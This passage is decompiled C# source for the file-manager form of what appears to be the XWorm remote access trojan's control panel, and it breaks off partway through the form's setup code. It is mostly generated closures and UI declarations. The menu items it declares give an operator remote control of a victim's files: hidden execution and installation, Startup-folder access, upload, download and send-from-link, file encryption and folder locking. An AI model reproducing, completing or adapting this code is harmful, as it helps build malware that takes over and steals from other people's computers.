#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;


namespace XWorm;

[DesignerGenerated]
public class FM : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__257_002D0
	{
		public ListViewItem _0024VB_0024Local_item1;

		public ListView _0024VB_0024Local_lstSource;

		public MethodInvoker _0024I1;

		public _Closure_0024__257_002D0(_Closure_0024__257_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_item1 = arg0._0024VB_0024Local_item1;
				_0024VB_0024Local_lstSource = arg0._0024VB_0024Local_lstSource;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			_0024VB_0024Local_lstSource.Items.Remove(_0024VB_0024Local_item1);
			_0024VB_0024Local_lstSource.EndUpdate();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__257_002D1
	{
		public int _0024VB_0024Local_Index;

		public ListViewItem _0024VB_0024Local_cItem;

		public _Closure_0024__257_002D0 _Closure_0024__257_002D0_0;

		public MethodInvoker _0024I0;

		public MethodInvoker _0024I2;

		public _Closure_0024__257_002D1(_Closure_0024__257_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_Index = arg0._0024VB_0024Local_Index;
				_0024VB_0024Local_cItem = arg0._0024VB_0024Local_cItem;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_Closure_0024__257_002D0_0._0024VB_0024Local_item1 = _Closure_0024__257_002D0_0._0024VB_0024Local_lstSource.Items[_0024VB_0024Local_Index];
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			_Closure_0024__257_002D0_0._0024VB_0024Local_lstSource.BeginUpdate();
			_Closure_0024__257_002D0_0._0024VB_0024Local_lstSource.Items.Add(_0024VB_0024Local_cItem);
			_Closure_0024__257_002D0_0._0024VB_0024Local_lstSource.EndUpdate();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R261_002D8
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R261_002D8(_Closure_0024__R261_002D8 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R10(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R267_002D14
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R267_002D14(_Closure_0024__R267_002D14 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R16(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R279_002D34
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R279_002D34(_Closure_0024__R279_002D34 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R36(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R280_002D36
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R280_002D36(_Closure_0024__R280_002D36 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R38(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R281_002D38
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R281_002D38(_Closure_0024__R281_002D38 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R40(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R282_002D40
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R282_002D40(_Closure_0024__R282_002D40 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R43(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R282_002D41
	{
		public GClass5 _0024VB_0024NonLocal_3;

		public _Closure_0024__R282_002D41(_Closure_0024__R282_002D41 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_3 = arg0._0024VB_0024NonLocal_3;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R44(object a0)
		{
			_0024VB_0024NonLocal_3.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R283_002D44
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R283_002D44(_Closure_0024__R283_002D44 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R47(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R283_002D45
	{
		public GClass5 _0024VB_0024NonLocal_3;

		public _Closure_0024__R283_002D45(_Closure_0024__R283_002D45 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_3 = arg0._0024VB_0024NonLocal_3;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R48(object a0)
		{
			_0024VB_0024NonLocal_3.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R284_002D48
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R284_002D48(_Closure_0024__R284_002D48 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R50(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R285_002D50
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R285_002D50(_Closure_0024__R285_002D50 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R52(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R288_002D56
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R288_002D56(_Closure_0024__R288_002D56 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R58(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R289_002D58
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R289_002D58(_Closure_0024__R289_002D58 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R60(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R291_002D62
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R291_002D62(_Closure_0024__R291_002D62 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R64(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R292_002D64
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R292_002D64(_Closure_0024__R292_002D64 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R66(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R293_002D66
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R293_002D66(_Closure_0024__R293_002D66 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R68(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R300_002D76
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R300_002D76(_Closure_0024__R300_002D76 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R78(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R301_002D78
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R301_002D78(_Closure_0024__R301_002D78 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R80(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R302_002D80
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R302_002D80(_Closure_0024__R302_002D80 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R82(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R303_002D82
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R303_002D82(_Closure_0024__R303_002D82 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R84(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox1")]
	private Guna2TextBox _Guna2TextBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackToolStripMenuItem1")]
	private ToolStripMenuItem _BackToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DesktopToolStripMenuItem")]
	private ToolStripMenuItem _DesktopToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UserFolderToolStripMenuItem")]
	private ToolStripMenuItem _UserFolderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TempToolStripMenuItem1")]
	private ToolStripMenuItem _TempToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AppDataToolStripMenuItem")]
	private ToolStripMenuItem _AppDataToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StartupToolStripMenuItem1")]
	private ToolStripMenuItem _StartupToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem1")]
	private ToolStripMenuItem _CopyToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CutToolStripMenuItem1")]
	private ToolStripMenuItem _CutToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PasteToolStripMenuItem")]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EditToolStripMenuItem1")]
	private ToolStripMenuItem _EditToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NormalToolStripMenuItem1")]
	private ToolStripMenuItem _NormalToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HiddenToolStripMenuItem1")]
	private ToolStripMenuItem _HiddenToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RunAsToolStripMenuItem1")]
	private ToolStripMenuItem _RunAsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RenameToolStripMenuItem1")]
	private ToolStripMenuItem _RenameToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem1")]
	private ToolStripMenuItem _DeleteToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UploadToolStripMenuItem2")]
	private ToolStripMenuItem _UploadToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DownloadToolStripMenuItem1")]
	private ToolStripMenuItem _DownloadToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NewFolderToolStripMenuItem1")]
	private ToolStripMenuItem _NewFolderToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NewFileToolStripMenuItem")]
	private ToolStripMenuItem _NewFileToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShowFolderFileToolStripMenuItem")]
	private ToolStripMenuItem _ShowFolderFileToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HideFolderFileToolStripMenuItem")]
	private ToolStripMenuItem _HideFolderFileToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HiddenInstallationlToolStripMenuItem")]
	private ToolStripMenuItem _HiddenInstallationlToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ZipToolStripMenuItem2")]
	private ToolStripMenuItem _ZipToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UnzipToolStripMenuItem1")]
	private ToolStripMenuItem _UnzipToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UploadToolStripMenuItem")]
	private ToolStripMenuItem _UploadToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SettingsToolStripMenuItem1")]
	private ToolStripMenuItem _SettingsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SendFromLinkToolStripMenuItem1")]
	private ToolStripMenuItem _SendFromLinkToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SetBackgroundToolStripMenuItem1")]
	private ToolStripMenuItem _SetBackgroundToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PlayToolStripMenuItem1")]
	private ToolStripMenuItem _PlayToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StopToolStripMenuItem1")]
	private ToolStripMenuItem _StopToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EncryptToolStripMenuItem")]
	private ToolStripMenuItem _EncryptToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DecryptToolStripMenuItem")]
	private ToolStripMenuItem _DecryptToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LockToolStripMenuItem")]
	private ToolStripMenuItem _LockToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UnlockToolStripMenuItem")]
	private ToolStripMenuItem _UnlockToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DownloadFolderToolStripMenuItem")]
	private ToolStripMenuItem _DownloadFolderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton4")]
	private Guna2GradientButton _Guna2GradientButton4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox2")]
	private Guna2TextBox _Guna2TextBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FileHashToolStripMenuItem")]
	private ToolStripMenuItem _FileHashToolStripMenuItem;

	public GClass5 gclass5_0;

	public string string_0;

	public string string_1;

	public string string_2;

	[field: AccessedThroughProperty("ImageList1")]
	public ImageList ImageList1
		;
	[field: AccessedThroughProperty("FileName")]
	public ColumnHeader FileName
;

	public ListView ListView1
;

	[field: AccessedThroughProperty("PictureBox1")]
	public PictureBox PictureBox1
	;

	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel2")]
	public ToolStripStatusLabel ToolStripStatusLabel2
	;

	public Guna2TextBox Guna2TextBox1
	;

	[field: AccessedThroughProperty("Guna2ContextMenuStrip2")]
	public Guna2ContextMenuStrip Guna2ContextMenuStrip2
	;

	public ToolStripMenuItem BackToolStripMenuItem1
	;

	public ToolStripMenuItem RefreshToolStripMenuItem

;

	[field: AccessedThroughProperty("GoToToolStripMenuItem1")]
	public ToolStripMenuItem GoToToolStripMenuItem1
;

	public ToolStripMenuItem DesktopToolStripMenuItem
;

	public ToolStripMenuItem UserFolderToolStripMenuItem
	;

	public ToolStripMenuItem TempToolStripMenuItem1

	;

	public ToolStripMenuItem AppDataToolStripMenuItem
	;

	public ToolStripMenuItem StartupToolStripMenuItem1
	;


	public ToolStripMenuItem CopyToolStripMenuItem1
	;

	public ToolStripMenuItem CutToolStripMenuItem1
	;


	public ToolStripMenuItem PasteToolStripMenuItem
	;


	public ToolStripMenuItem EditToolStripMenuItem1
	;


	[field: AccessedThroughProperty("ExecuteToolStripMenuItem1")]
	public ToolStripMenuItem ExecuteToolStripMenuItem1
	;

	public ToolStripMenuItem NormalToolStripMenuItem1
	;


	public ToolStripMenuItem HiddenToolStripMenuItem1
;

	public ToolStripMenuItem RunAsToolStripMenuItem1
	;

	public ToolStripMenuItem RenameToolStripMenuItem1
	;

	public ToolStripMenuItem DeleteToolStripMenuItem1
;


	public ToolStripMenuItem UploadToolStripMenuItem2
	;

	public ToolStripMenuItem DownloadToolStripMenuItem1
;

	public ToolStripMenuItem NewFolderToolStripMenuItem1
	;

	public ToolStripMenuItem NewFileToolStripMenuItem
	;

	[field: AccessedThroughProperty("ShowHideToolStripMenuItem1")]
	public ToolStripMenuItem ShowHideToolStripMenuItem1
	;

	public ToolStripMenuItem ShowFolderFileToolStripMenuItem
;

	public ToolStripMenuItem HideFolderFileToolStripMenuItem
	;

	[field: AccessedThroughProperty("ZipToolStripMenuItem1")]
	public ToolStripMenuItem ZipToolStripMenuItem1
	;

	public ToolStripMenuItem HiddenInstallationlToolStripMenuItem
	;

	public ToolStripMenuItem ZipToolStripMenuItem2
;


	public ToolStripMenuItem UnzipToolStripMenuItem1
	;

	[field: AccessedThroughProperty("FtpToolStripMenuItem")]
	public ToolStripMenuItem FtpToolStripMenuItem
;

	public ToolStripMenuItem UploadToolStripMenuItem
	;

	public ToolStripMenuItem SettingsToolStripMenuItem1
;

	public ToolStripMenuItem SendFromLinkToolStripMenuItem1
;

	public ToolStripMenuItem SetBackgroundToolStripMenuItem1
	;

	[field: AccessedThroughProperty("PlayMusicToolStripMenuItem")]
	public ToolStripMenuItem PlayMusicToolStripMenuItem
	;

	public ToolStripMenuItem PlayToolStripMenuItem1
	;
	public ToolStripMenuItem StopToolStripMenuItem1
	;

	[field: AccessedThroughProperty("ToolStripMenuItem2")]
	public ToolStripMenuItem ToolStripMenuItem2
	;

	public ToolStripMenuItem EncryptToolStripMenuItem
;

	public ToolStripMenuItem DecryptToolStripMenuItem
	;

	[field: AccessedThroughProperty("FolderLockToolStripMenuItem")]
	public ToolStripMenuItem FolderLockToolStripMenuItem
	;

	public ToolStripMenuItem LockToolStripMenuItem
	;

	public ToolStripMenuItem UnlockToolStripMenuItem
	;

	[field: AccessedThroughProperty("Datemod")]
	public ColumnHeader Datemod
	;

	[field: AccessedThroughProperty("Type")]
	public ColumnHeader Type
	;

	[field: AccessedThroughProperty("Fsize")]
	public ColumnHeader Fsize
	;

	public ToolStripMenuItem DownloadFolderToolStripMenuItem
	;

	[field: AccessedThroughProperty("Guna2Panel1")]
	public Guna2Panel Guna2Panel1
	;

	public Guna2GradientButton Guna2GradientButton4
	;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	public Guna2TextBox Guna2TextBox2
	;
	public ToolStripMenuItem FileHashToolStripMenuItem
	;

	public FM()
	{
		base.Load += FM_Load;
		base.FormClosing += FM_FormClosing;
		base.Resize += FM_Resize;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.FM));
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.FileName = new System.Windows.Forms.ColumnHeader();
		this.ListView1 = new System.Windows.Forms.ListView();
		this.Datemod = new System.Windows.Forms.ColumnHeader();
		this.Type = new System.Windows.Forms.ColumnHeader();
		this.Fsize = new System.Windows.Forms.ColumnHeader();
		this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.BackToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RefreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.GoToToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UserFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TempToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.AppDataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.StartupToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.CopyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.CutToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EditToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.FileHashToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ExecuteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.NormalToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.HiddenToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RunAsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DeleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DownloadToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RenameToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.UploadToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.NewFolderToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DecryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FolderLockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.LockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UnlockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.NewFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ShowHideToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ShowFolderFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.HideFolderFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ZipToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.HiddenInstallationlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ZipToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.UnzipToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.FtpToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SettingsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.SendFromLinkToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.SetBackgroundToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.PlayMusicToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PlayToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.StopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DownloadFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.ToolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		this.Label1 = new System.Windows.Forms.Label();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
